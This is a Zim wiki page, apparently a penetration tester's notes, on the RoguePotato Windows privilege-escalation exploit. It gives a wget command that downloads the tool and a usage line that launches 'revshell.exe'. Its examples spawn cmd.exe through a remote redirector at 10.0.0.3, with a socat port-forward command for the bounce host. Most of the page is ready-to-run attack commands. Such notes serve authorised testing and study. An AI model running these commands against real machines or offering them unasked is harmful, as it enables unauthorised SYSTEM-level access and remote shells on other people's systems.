Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-12-02T20:22:24-05:00

====== RoguePotato ======
Created Thursday 02 December 2021

===== Description =====
* Performs privilege escalation againsts windows targets vulnerable against this attack


===== Website =====
https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/

===== Installation =====
{{{code: lang="sh" linenumbers="False"
wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip
}}}


===== Usage =====
{{{code: lang="texinfo" linenumbers="False"
.\RoguePotato -l 9999 -e "revshell.exe" -r <ip_of_bounce_host>
}}}


===== Options =====
{{{code: lang="texinfo" linenumbers="False"
Mandatory args: 
-r remote_ip: ip of the remote machine to use as redirector
-e commandline: commandline of the program to launch


Optional args: 
-l listening_port: This will run the RogueOxidResolver locally on the specified port
-c {clsid}: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-p pipename_placeholder: placeholder to be used in the pipe name creation (default: RoguePotato)
-z : this flag will randomize the pipename_placeholder (don't use with -p)


Examples: 
 - Network redirector / port forwarder to run on your remote machine, must use port 135 as src port
	socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999
 - RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. Use this if you have fw restrictions.
	RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"
 - RoguePotato all in one with RogueOxidResolver running locally on port 9999
	RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999
 - RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename
	RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode

}}}


===== Examples =====
{{{code: lang="sh" linenumbers="False"
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"
}}}

* RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. Use this if you have fw restrictions.

{{{code: lang="sh" linenumbers="False"
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999
}}}

* RoguePotato all in one with RogueOxidResolver running locally on port 9999

{{{code: lang="texinfo" linenumbers="False"
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode
}}}

* RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename

===== SEE =====
[[AttackVectors:Windows:Exploits:Potatoes:Rogue Potato]]
